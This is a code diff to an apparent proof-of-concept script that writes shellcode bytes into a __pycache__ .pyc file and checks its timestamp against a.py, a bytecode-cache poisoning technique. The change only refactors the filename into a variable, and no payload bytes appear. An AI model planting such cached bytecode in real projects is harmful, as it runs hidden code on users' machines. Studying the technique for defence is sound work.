@@ -86,15 +86,17 @@ log(f'''Created shellcode:
 
 time.sleep(0.1)
 
+pyc_filename = 'a.cpython-39.pyc'
+
 log(f'Writing shellcode to pycache...')
 
 os.mkdir('__pycache__')
 
-with open('./__pycache__/a.cpython-39.pyc', 'wb') as file:
+with open(f'./__pycache__/{pyc_filename}', 'wb') as file:
     file.write(shellcode_bytes)
 
 
-modification_time_shellcode = int(os.stat('./__pycache__/a.cpython-39.pyc').st_mtime)
+modification_time_shellcode = int(os.stat(f'./__pycache__/{pyc_filename}').st_mtime)
 modification_time_difference = modification_time_shellcode - modification_time
 
 log(f'Shellcode/pycache was modified ~{modification_time_difference} seconds after a.py.')
